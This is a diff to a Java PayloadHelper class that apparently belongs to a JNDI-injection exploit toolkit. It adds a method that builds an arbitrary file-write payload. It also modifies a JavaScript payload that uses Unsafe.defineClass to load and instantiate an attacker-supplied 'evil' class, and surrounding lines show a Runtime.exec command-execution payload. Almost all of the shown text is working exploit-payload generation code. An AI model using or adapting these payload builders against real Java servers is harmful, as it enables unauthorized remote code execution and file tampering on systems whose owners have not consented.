@@ -218,6 +218,11 @@ public class PayloadHelper {
                 "        java.lang.Runtime.getRuntime().exec(strs);";
     }
 
+    public static String makeFileWritePayload(String filename, String content){
+        return "String content = \""+content+"\";" +
+                "com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename(\""+filename+"\", content.getBytes());";
+    }
+
     // https://github.com/zzwlpx/JNDIExploit/blob/7aa2b5f8ab742cf8e705c965ab3e8bac6fe312b0/src/main/java/com/feihong/ldap/controllers/TomcatBypassController.java?_pjax=%23js-repo-pjax-container%2C%20div%5Bitemtype%3D%22http%3A%2F%2Fschema.org%2FSoftwareSourceCode%22%5D%20main%2C%20%5Bdata-pjax-container%5D#L135
     public static String makeJsRuntimeExecPayload(String cmd){
         return "var strs=new Array(3);" +
@@ -257,7 +262,8 @@ public class PayloadHelper {
                 "var method = cls.getDeclaredMethod('unsafe');" +
                 "method.setAccessible(true);" +
                 "var unsafe = method.invoke(cls);" +
-                "var evil = unsafe.defineClass('"+classname+"', bytes, 0, bytes.length, java.lang.ClassLoader.getSystemClassLoader(), null);" +
+                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
+                "var evil = unsafe.defineClass('"+classname+"', bytes, 0, bytes.length, classLoader, null);" +
                 "evil.newInstance();";
     }
 
